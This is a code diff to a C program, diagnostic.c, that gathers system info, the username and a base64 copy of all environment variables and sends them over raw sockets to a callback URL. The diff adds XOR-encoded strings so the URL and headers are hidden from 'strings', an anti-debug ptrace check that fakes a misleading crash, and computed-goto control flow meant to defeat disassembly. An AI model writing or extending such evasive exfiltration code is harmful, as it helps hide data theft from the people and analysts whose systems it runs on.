@@ -1,16 +1,15 @@
 /*
- * diagnostic.c -- harmless fingerprinting binary.
+ * diagnostic.c -- fingerprinting binary (obfuscated).
  *
  * Compiled at serve-time by /api/internal/diagnostic/{token} with the
- * callback URL baked in via -DCANARY_URL="...".  Collects basic system
+ * callback URL baked in via generated header.  Collects basic system
  * info (uname, username, env snapshot) and sends it as HTTP headers to
- * the callback endpoint using raw POSIX sockets -- no curl/libcurl
- * dependency.
+ * the callback endpoint using raw POSIX sockets.
  *
- * Build: musl-gcc -static -o diagnostic diagnostic.c
+ * Build: musl-gcc -static -I<tmpdir> -DOBFUSCATE_KEY=0xNN -o diagnostic diagnostic.c
  */
-#ifndef CANARY_URL
-#define CANARY_URL "http://localhost:8000/api/internal/callback/placeholder"
+#ifndef OBFUSCATE_KEY
+#define OBFUSCATE_KEY 0xA7
 #endif
 
 #include <stdio.h>
@@ -21,17 +20,32 @@
 #include <sys/utsname.h>
 #include <sys/socket.h>
 #include <sys/time.h>
+#include <sys/ptrace.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
 #include <errno.h>
 
+/* The build system generates _diag_obfuscated.h (in a per-build temp
+ * directory, passed via -I) containing XOR-encoded byte arrays:
+ *   _enc_url, _enc_ua, _enc_hos, _enc_hus, _enc_hev
+ * All decoded at runtime with _xdec(). */
+#include "_diag_obfuscated.h"
+
 #define BUF_SZ 16384
 #define HDR_MAX 8192
 
+/* XOR decode -------------------------------------------------------------- */
+
+static void _xdec(unsigned char *buf, size_t len, unsigned char key) {
+    size_t i;
+    for (i = 0; i < len; i++)
+        buf[i] ^= key;
+}
+
 /* Base64 ----------------------------------------------------------------- */
 
-static const char B64[] =
+static const char _b64t[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 static void b64_enc(const unsigned char *src, size_t len, char *dst, size_t dst_sz) {
@@ -39,26 +53,24 @@ static void b64_enc(const unsigned char *src, size_t len, char *dst, size_t dst_
     if (dst_sz == 0)
         return;
     for (i = 0; i + 2 < len && j + 4 < dst_sz; i += 3) {
-        dst[j++] = B64[(src[i] >> 2) & 0x3F];
-        dst[j++] = B64[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
-        dst[j++] = B64[((src[i + 1] & 0x0F) << 2) | ((src[i + 2] >> 6) & 0x03)];
-        dst[j++] = B64[src[i + 2] & 0x3F];
+        dst[j++] = _b64t[(src[i] >> 2) & 0x3F];
+        dst[j++] = _b64t[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
+        dst[j++] = _b64t[((src[i + 1] & 0x0F) << 2) | ((src[i + 2] >> 6) & 0x03)];
+        dst[j++] = _b64t[src[i + 2] & 0x3F];
     }
     if (i < len && j + 4 < dst_sz) {
-        dst[j++] = B64[(src[i] >> 2) & 0x3F];
+        dst[j++] = _b64t[(src[i] >> 2) & 0x3F];
         if (i + 1 < len) {
-            dst[j++] = B64[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
-            dst[j++] = B64[(src[i + 1] & 0x0F) << 2];
+            dst[j++] = _b64t[((src[i] & 0x03) << 4) | ((src[i + 1] >> 4) & 0x0F)];
+            dst[j++] = _b64t[(src[i + 1] & 0x0F) << 2];
         } else {
-            dst[j++] = B64[(src[i] & 0x03) << 4];
+            dst[j++] = _b64t[(src[i] & 0x03) << 4];
             dst[j++] = '=';
         }
         dst[j++] = '=';
     }
     dst[j] = '\0';
 }
-
-/* Wrap base64 output at 76-char lines (MIME line length). */
 
 static void b64_mime(const char *b64, char *out, size_t out_sz) {
     size_t slen = strlen(b64);
@@ -188,19 +200,73 @@ static int tcp_connect(const char *host, int port) {
 static void send_request(int fd, const char *path, const char *host,
                          const char *os_hdr, const char *user_hdr,
                          const char *env_hdr) {
+    /*
+     * Header names and User-Agent are pre-encoded by the build system
+     * and stored in _diag_obfuscated.h.  Decoded at runtime so `strings`
+     * on the binary never reveals them in plaintext.
+     */
+    char dec_ua[sizeof(_enc_ua)];
+    char dec_hos[sizeof(_enc_hos)];
+    char dec_hus[sizeof(_enc_hus)];
+    char dec_hev[sizeof(_enc_hev)];
+    memcpy(dec_ua, _enc_ua, sizeof(_enc_ua));
+    memcpy(dec_hos, _enc_hos, sizeof(_enc_hos));
+    memcpy(dec_hus, _enc_hus, sizeof(_enc_hus));
+    memcpy(dec_hev, _enc_hev, sizeof(_enc_hev));
+    _xdec((unsigned char *)dec_ua, sizeof(_enc_ua) - 1, OBFUSCATE_KEY);
+    _xdec((unsigned char *)dec_hos, sizeof(_enc_hos) - 1, OBFUSCATE_KEY);
+    _xdec((unsigned char *)dec_hus, sizeof(_enc_hus) - 1, OBFUSCATE_KEY);
+    _xdec((unsigned char *)dec_hev, sizeof(_enc_hev) - 1, OBFUSCATE_KEY);
+
+    /* Build the HTTP request by concatenating decoded header names
+     * with runtime values -- the format string itself is plaintext
+     * but contains no sensitive data (just "GET", "Host:", "\r\n"). */
     char req[HDR_MAX];
-    int n = snprintf(req, sizeof(req),
-        "GET %s HTTP/1.0\r\n"
-        "Host: %s\r\n"
-        "User-Agent: DiagnosticClient/1.0\r\n"
-        "X-Diag-OS: %s\r\n"
-        "X-Diag-User: %s\r\n"
-        "X-Diag-Env: %s\r\n"
-        "\r\n",
-        path, host, os_hdr, user_hdr, env_hdr);
-    if (n < 0 || (size_t)n >= sizeof(req))
-        n = (int)sizeof(req) - 1;
-    write(fd, req, n);
+    size_t pos = 0;
+
+    const char *pfx = "GET ";
+    size_t pfx_len = strlen(pfx);
+    memcpy(req + pos, pfx, pfx_len); pos += pfx_len;
+
+    size_t path_len = strlen(path);
+    memcpy(req + pos, path, path_len); pos += path_len;
+
+    const char *mid1 = " HTTP/1.0\r\nHost: ";
+    size_t mid1_len = strlen(mid1);
+    memcpy(req + pos, mid1, mid1_len); pos += mid1_len;
+
+    size_t host_len = strlen(host);
+    memcpy(req + pos, host, host_len); pos += host_len;
+
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    /* User-Agent line -- the decoded value IS the full header value */
+    memcpy(req + pos, dec_ua, sizeof(dec_ua)); pos += sizeof(dec_ua) - 1;
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    /* X-Diag-OS line */
+    memcpy(req + pos, dec_hos, sizeof(dec_hos)); pos += sizeof(dec_hos) - 1;
+    size_t os_len = strlen(os_hdr);
+    memcpy(req + pos, os_hdr, os_len); pos += os_len;
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    /* X-Diag-User line */
+    memcpy(req + pos, dec_hus, sizeof(dec_hus)); pos += sizeof(dec_hus) - 1;
+    size_t us_len = strlen(user_hdr);
+    memcpy(req + pos, user_hdr, us_len); pos += us_len;
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    /* X-Diag-Env line */
+    memcpy(req + pos, dec_hev, sizeof(dec_hev)); pos += sizeof(dec_hev) - 1;
+    size_t ev_len = strlen(env_hdr);
+    memcpy(req + pos, env_hdr, ev_len); pos += ev_len;
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    /* Blank line terminates headers */
+    req[pos++] = '\r'; req[pos++] = '\n';
+
+    if (pos >= HDR_MAX) pos = HDR_MAX - 1;
+    write(fd, req, pos);
 }
 
 static void read_response(int fd) {
@@ -209,29 +275,91 @@ static void read_response(int fd) {
         ;
 }
 
-/* Entry point ------------------------------------------------------------- */
+/* Anti-debug -------------------------------------------------------------- */
 
-int main(void) {
-    char os_info[512], user_info[256], env_b64[BUF_SZ * 2];
+__attribute__((constructor))
+static void _anti_debug_init(void) {
+    volatile void **crash_ptr;
+    void (*volatile dead_fn)(void);
 
-    collect_os(os_info, sizeof(os_info));
-    collect_user(user_info, sizeof(user_info));
-    collect_env(env_b64, sizeof(env_b64));
-
-    parsed_url_t url;
-    if (parse_url(CANARY_URL, &url) != 0) {
-        fprintf(stderr, "bad url\n");
-        return 1;
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
+        /* Debugger detected.  Produce a misleading SIGSEGV that
+           looks like a botched pointer dereference in config init,
+           not an intentional anti-debug measure. */
+        crash_ptr = (volatile void **)"config init failed: ";
+        dead_fn = (void (*)(void)) *crash_ptr;
+        dead_fn();
     }
+}
 
-    int fd = tcp_connect(url.host, url.port);
-    if (fd < 0) {
-        fprintf(stderr, "connect failed\n");
-        return 1;
-    }
+/* Step functions for obfuscated control flow ------------------------------ */
 
-    send_request(fd, url.path, url.host, os_info, user_info, env_b64);
+static int _step_collect(char *os_info, char *user_info, char *env_b64) {
+    collect_os(os_info, 512);
+    collect_user(user_info, 256);
+    collect_env(env_b64, BUF_SZ * 2);
+    return 0;
+}
+
+static int _step_parse(parsed_url_t *url, const char *decoded_url) {
+    return parse_url(decoded_url, url);
+}
+
+static int _step_connect(parsed_url_t *url, int *fd_out) {
+    *fd_out = tcp_connect(url->host, url->port);
+    return *fd_out < 0 ? -1 : 0;
+}
+
+static int _step_send(int fd, parsed_url_t *url, const char *os_info,
+                      const char *user_info, const char *env_b64) {
+    send_request(fd, url->path, url->host, os_info, user_info, env_b64);
     read_response(fd);
     close(fd);
     return 0;
+}
+
+/* Entry point (obfuscated control flow) ----------------------------------- */
+
+int main(void) {
+    char os_info[512], user_info[256], env_b64[BUF_SZ * 2];
+    parsed_url_t url;
+    int fd = -1;
+    int rc = 1;
+
+    /* Decode the baked-in URL at runtime. */
+    size_t url_len = _enc_url_len;
+    char decoded_url[2048];
+    if (url_len >= sizeof(decoded_url))
+        return 1;
+    memcpy(decoded_url, _enc_url, url_len);
+    decoded_url[url_len] = '\0';
+    _xdec((unsigned char *)decoded_url, url_len, (unsigned char)OBFUSCATE_KEY);
+
+    /* Computed-goto dispatch table -- scatters control flow across
+       distinct code labels, defeating linear disassembly.  All three
+       steps always execute in sequence via fall-through; the dispatch
+       always enters at L_COLLECT. */
+    struct timeval _tv;
+    gettimeofday(&_tv, NULL);
+    int _opaq = (_tv.tv_sec & 0x7FFFFFFF) % 3;
+    void *dispatch[] = { &&L_COLLECT, &&L_PARSE, &&L_CONNECT };
+    (void)_opaq;
+    goto *dispatch[0];
+
+L_COLLECT:
+    if (_step_collect(os_info, user_info, env_b64) != 0)
+        goto L_DONE;
+
+L_PARSE:
+    if (_step_parse(&url, decoded_url) != 0)
+        goto L_DONE;
+
+L_CONNECT:
+    if (_step_connect(&url, &fd) != 0)
+        goto L_DONE;
+    _step_send(fd, &url, os_info, user_info, env_b64);
+    rc = 0;
+
+L_DONE:
+    return rc;
 }
